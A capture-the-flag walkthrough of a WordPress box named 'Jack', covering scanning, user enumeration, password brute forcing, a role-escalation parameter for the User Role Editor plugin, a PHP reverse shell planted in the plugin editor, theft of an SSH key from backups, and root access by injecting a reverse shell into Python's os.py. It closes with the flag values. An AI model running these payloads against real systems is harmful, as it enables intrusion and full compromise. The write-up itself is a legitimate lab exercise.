# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgHGMuutSoQktLWJfDa8F4+zCvINuPv8+mL2sHPJmSfFDaQ3jlsxitYWH7FWdj3zPzXLW01aY+AySXW593T3XZpzCSAjm3ImnPtNTaQsbsdkgmhj8eZ3q9hPxU5UD5593K+/FDdIiN5xIBLegm6y0SAd3sRtpdrcpHpkqOIZvoCyJTV7ncbRY0gppvfTEObo2PiCtzh31gbaDPrJICPnDuuF5aWAUTeUMc0YcMYaB9cCvfVT6Y1Cdfh4IwMHslafXRhRt5tn5l47xR0xwd3cddUEez/CHxiNthNTgv+BSo+TPPciPAiCN3QGSqTcPQ74RvFiAznL2irkENq+Qws2A3
|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzJknVQsubSrZMKNLlNAP1HXXuXzhtAf24ScY17eIS03NfxjFwiSESz8xKwVcmbODQGc+b9PvepngTTGlVrMf4=
|   256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/WxvJRsI0dvT84mxR/y3AH3C8KP/1Njv4wP6DylZeQ
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-generator: WordPress 5.3.2
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# RECONNAISSANCE
---

Let's check the web application, we need to add `jack.thm` to `/etc/hosts`:

```
echo '10.10.153.131 jack.thm' | sudo tee -a /etc/hosts
```


![Pasted image 20250617125606.png](../../IMAGES/Pasted%20image%2020250617125606.png)

Time to fuzz, let's find anything hidden on here:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://jack.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jack.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 180ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 180ms]
                        [Status: 200, Size: 17360, Words: 1442, Lines: 272, Duration: 291ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 314ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 235ms]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 976ms]
```

Not much, the scan said that `robots.txt` entrance is allowed, let's check:

![Pasted image 20250617125947.png](../../IMAGES/Pasted%20image%2020250617125947.png)

Since we got `wp-admin`, we know that we are dealing with a WordPress installation, no need to check the login page since we don't have credentials yet, instead, let's use `wpscan` to enumerate the web application:

```bash
wpscan --url http://jack.thm -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://jack.thm/ [10.10.153.131]
[+] Started: Tue Jun 17 18:01:51 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2024-02-05T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.1.1
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==========================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```


As seen, we find some users, we're also dealing with `wordpress 5.3.2`, since we got users, we can try brute forcing the `wp-admin` page to get credentials, let's proceed to exploitation.


# EXPLOITATION
---

So, we already know we must brute force or that's the path we're going to take, let's save the following usernames in a file:

```
jack
wendy
danny
```


Now we can brute force:

```
wpscan -U users.txt -P /usr/share/wordlists/fasttrack.txt --url http://jack.thm
```

After a couple minutes of wait, we get credentials for Wendy, if you want to speed up the process, just use Wendy as the username:

![Pasted image 20250617132550.png](../../IMAGES/Pasted%20image%2020250617132550.png)


```
wendy:changelater
```


Let's login:

![Pasted image 20250617132639.png](../../IMAGES/Pasted%20image%2020250617132639.png)


![Pasted image 20250617132721.png](../../IMAGES/Pasted%20image%2020250617132721.png)

Unfortunately for us, we cannot do much to get a reverse shell yet, we need to exploit this: 
 
`EXPLOIT: https://www.exploit-db.com/exploits/44595`

![Pasted image 20250617153937.png](../../IMAGES/Pasted%20image%2020250617153937.png)


Basically, we need to intercept the request and change a parameter, let's do it:

![Pasted image 20250617154114.png](../../IMAGES/Pasted%20image%2020250617154114.png)

Click on Update Profile:

![Pasted image 20250617154612.png](../../IMAGES/Pasted%20image%2020250617154612.png)

On here we need to add:

```
&ure_other_roles=administrator&
```


![Pasted image 20250617154700.png](../../IMAGES/Pasted%20image%2020250617154700.png)

Once we send the request, we notice our dashboard changed:

![Pasted image 20250617154828.png](../../IMAGES/Pasted%20image%2020250617154828.png)

We got new functionalities, we can get a shell through the `plugin editor`:

![Pasted image 20250617154915.png](../../IMAGES/Pasted%20image%2020250617154915.png)

We can simply add this on top:

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.21.28 9001 >/tmp/f);?>
```


![Pasted image 20250617155345.png](../../IMAGES/Pasted%20image%2020250617155345.png)



Save it and now we need to trigger it:

![Pasted image 20250617155131.png](../../IMAGES/Pasted%20image%2020250617155131.png)

To trigger it, we need to go to `Installed Plugins` and activate it:


![Pasted image 20250617155159.png](../../IMAGES/Pasted%20image%2020250617155159.png)

If we check our listener:

![Pasted image 20250617155405.png](../../IMAGES/Pasted%20image%2020250617155405.png)

Ok time for privilege escalation.


# PRIVILEGE ESCALATION
---


First of all, let's stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250617155558.png](../../IMAGES/Pasted%20image%2020250617155558.png)

Now we're good to go, let's check users:

![Pasted image 20250617155642.png](../../IMAGES/Pasted%20image%2020250617155642.png)

We only got `jack`, let's check his home:

![Pasted image 20250617155725.png](../../IMAGES/Pasted%20image%2020250617155725.png)

We got a `reminder.txt` file:


![Pasted image 20250617155949.png](../../IMAGES/Pasted%20image%2020250617155949.png)

They talking bout some backups, let's use linpeas to check that:

![Pasted image 20250617161259.png](../../IMAGES/Pasted%20image%2020250617161259.png)

As seen, inside of `/var/backups` we can find the `id_rsa` for jack, let's grab it and get into ssh:

![Pasted image 20250617161410.png](../../IMAGES/Pasted%20image%2020250617161410.png)

Nice, it works, we can run linpeas again and `pspy` to check active processes and any other relevant info that may help us to get into root:

![Pasted image 20250617161855.png](../../IMAGES/Pasted%20image%2020250617161855.png)

Every minute, a `/opt/statuscheck/checker.py` script runs as root, let's check what it does and if we can modify it:

```python
jack@jack:/tmp$ cat /opt/statuscheck/checker.py
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

As seen, this runs `os.system` and  uses curl to save a log, we don't have write permission on this file unfortunately so we need another way to exploit this.

Once we use linpeas, we notice we are part of the family group, this group has write permissions over `/usr/lib/python 2.7`:

![Pasted image 20250617162155.png](../../IMAGES/Pasted%20image%2020250617162155.png)

![Pasted image 20250617162303.png](../../IMAGES/Pasted%20image%2020250617162303.png)

What we can do is modify the `os.py` file to embed a reverse shell that will triggers once the cronjob scripts runs, let's do it, we need to modify:

```
/usr/lib/python2.7/os.py
```

We can add this at the end of the script, you can go to the last line on nano using:

```
alt /
```

Add the following:

```python
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("VPN_IP",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

![Pasted image 20250617162534.png](../../IMAGES/Pasted%20image%2020250617162534.png)

Now, save it and start the listener, once the script runs again, we will receive a shell:

![Pasted image 20250617162645.png](../../IMAGES/Pasted%20image%2020250617162645.png)

We can now read both flags and end the CTF:

```
root@jack:~# cat /home/jack/user.txt
0052f7829e48752f2e7bf50f1231548a

root@jack:~# cat /root/root.txt
b8b63a861cc09e853f29d8055d64bffb
```

![Pasted image 20250617162752.png](../../IMAGES/Pasted%20image%2020250617162752.png)

